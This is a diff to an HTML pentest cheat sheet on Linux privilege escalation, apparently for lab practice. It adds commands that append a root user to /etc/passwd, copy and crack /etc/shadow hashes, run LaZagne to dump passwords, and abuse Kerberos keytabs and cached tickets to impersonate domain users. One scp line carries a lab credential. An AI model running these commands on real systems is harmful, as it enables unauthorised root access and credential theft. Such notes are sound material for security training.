@@ -187,14 +187,31 @@ int main(){
                     <h2 id="Modifyable /etc/passwd">Modifyable /etc/passwd</h2>
                     <ul>
                         <p>In some cases we may found an /etc/passwd file which can be modifyed in that case we could add a new user with SUID permisions of root </p>
-                        
-                        
                         <pre><code class="language-bash">openssl passwd -1 -salt salt 1234</code></pre>
                         <pre><code class="language-bash">echo "hacked:$1$salt$kqNI5AJoJdN1WgWoNslBD0:0:0:root:/root:/bin/bash" >> /etc/passwd</code></pre>
                         <pre><code class="language-bash">su hacked 1234</code></pre>
+                        <p>We can always remove the <b>x</b> in the passwd file and login as root without providing the password</p>
                     </ul>
 
-                    <h2 id="Modifyable /etc/passwd">CVE-2021-3560 - Polkit</h2>
+                    <h2 id="Dumping credentials">Dumping credentials</h2>
+                    <ul>
+                        <h3>Shadow hashes</h3>
+                        <ul>
+                            <p>In case you have the necesary permission to copy /etc/passwd and /etc/shadow you coud export them and use <b>unshadow</b> tool to merge them</p>
+                            <pre><code class="language-bash">unshadow passwd shadow > unshadowed.hashes</code></pre>
+                            <p>Then you can attempt to crack them using hashcat</p>
+                            <pre><code class="language-bash">hashcat -m 1800 unshadow.hashes /usr/share/wordlists/rockyou.txt</code></pre>
+                        </ul>
+                        <h3>Common passwords</h3>
+                        <ul>
+                            <p>We can use <b>lazagne</b> in order to look for common passwords and dump them. In order to do so we need to transfer tool into the victims computer</p>
+                            <pre><code class="language-bash">scp -r LaZagne/Linux kira@"L0vey0u1\!":/tmp/</code></pre>
+                            <p>Finally run the tool</p>
+                            <pre><code class="language-bash">python3 lazagne.py all</code></pre>
+                        </ul>
+                    </ul>
+
+                    <h2 id="CVE-2021-3560 - Polkit">CVE-2021-3560 - Polkit</h2>
                     <ul>
                         <p>During privilege escalation you may find polkit version <b>0.113</b> and previous are afected by a vulnerability which will add a new user to the server with sudo permisions</p>
                         <p>This is due curious behaviour of polkit software which it's function defines and controls system-wide privielges </p>
@@ -206,8 +223,57 @@ int main(){
                         <p>To check polkit version use (Ubuntu, debian)</p>
                         <pre><code class="language-bash">dpkg -l | grep policykit-1
 rpm -qa</code></pre>
+                    </ul>  
+                    
+                    <h2 id="Linux Domain joined machine">Linux Domain joined machine</h2>
+                    <ul>
+                        <p>It is posible to find a linux box which is in a Windows domain. Here you can find information about how to approach this scenario</p>
+                        <h3>Enumeration</h3>
+                        <ul>
+                            <p>Checking if a machine is domain joined. Additionally you can check the groups the computer belongs and more</p>
+                            <pre><code class="language-bash">realm list</code></pre>
+                        </ul>
+
+                        <h3>Finding kerberos tickets</h3>
+                        <ul>
+                            <p>Tickets in linux systems are normally found in .keytab files an easy way to find them is by using</p>
+                            <pre><code class="language-bash">find / -name *keytab* -ls 2>/dev/null</code></pre>
+                            <p>Another way is by finding cronjobs</p>
+                            <pre><code class="language-bash">crontab -l</code></pre>
+                            <p>Another example is <b>ccache files</b> the path to this ones can be located by showing the content of KRB5CCNAME envrionmental variables (/tmp)</p>
+                            <pre><code class="language-bash">env | grep -i krb5</code></pre>
+                            <p>Once we found a ticket we can use klist to view information about this one</p>
+                            <pre><code class="language-bash">klist -c ccname_ticket-name</code></pre>
+                        </ul>
                         
-                    </ul>   
+                        <h3>Abusing keytabs</h3>
+                        <ul>
+                            <p><b>klist</b> itself can be used to show which username you are using also you can use the following to show information about a ticket</p>
+                            <pre><code class="language-bash">klist -k -t /opt/specialfiles/carlos.keytab </code></pre>
+                            <p>We can impersonate a user using a ticket by using</p>
+                            <pre><code class="language-bash">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</code></pre>
+                        </ul>
+                        <h3>Extracting hashes</h3>
+                        <ul>
+                            <p>We can use keytabextract.py in order to extract the hashes from a ticket</p>
+                            <pre><code class="language-bash">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab</code></pre>
+                            <p>Once you cracked the password you can simply login by using</p>
+                            <pre><code class="language-bash">su carlos@inlanefreight.htb</code></pre>
+                        </ul>
+
+                        <h3>Loading ticket from cache</h3>
+                        <ul>
+                            <p>In case you found a ticket inside /tmp you can use it by doing. First of all copy the ticket from /tmp to /root</p>
+                            <pre><code class="language-bash">cp krb5cc_647401106_uN5uvk /root/</code></pre>
+                            <p>Then export the ticket</p>
+                            <pre><code class="language-bash">export KRB5CCNAME=/root/krb5cc_647401106_uN5uvk</code></pre>
+                            <p>Check that you have exported the ticket correctly</p>
+                            <pre><code class="language-bash">klist</code></pre>
+                            <p>Finally use the exported ticket by issuing the <b>-k</b> flag .Example:</p>
+                            <pre><code class="language-bash">smbclient //dc01/C$ -k -c ls -no-pass</code></pre>
+                        </ul>
+                        
+                    </ul>
         </div>
     </div>
 </body>
